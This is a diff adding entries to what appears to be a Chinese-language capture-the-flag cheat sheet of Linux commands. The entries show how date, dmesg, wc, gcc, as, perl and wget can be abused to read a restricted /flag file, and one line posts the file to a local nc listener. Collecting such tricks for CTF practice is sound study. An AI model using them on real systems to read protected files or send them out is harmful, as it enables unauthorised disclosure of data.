@@ -161,4 +161,12 @@ mv： 文件移动
 perl：是perl语言解释器 perl -e 'open(my $fh, "<", "/flag") or die "Cannot open /flag: $!"; print while(<$fh>); close($fh);'
 python： python语言解释器
 ruby： ruby语言解释器
+
+date： 显示日期，可以 date -f /flag读取文件内容
+dmesg： 控制/显示内核环形缓冲区 dmesg -F /flag
+wc： 显示文件的单词，行数等等信息  wc --files0-from=/flag
+gcc： 编译器 gcc -x c -E /flag
+as： 汇编语言编译器 as /flag
+wget： 网络获取内容 nc -lp 8888 & wget --post-file=/flag http://127.0.0.1:8888
+
 ```
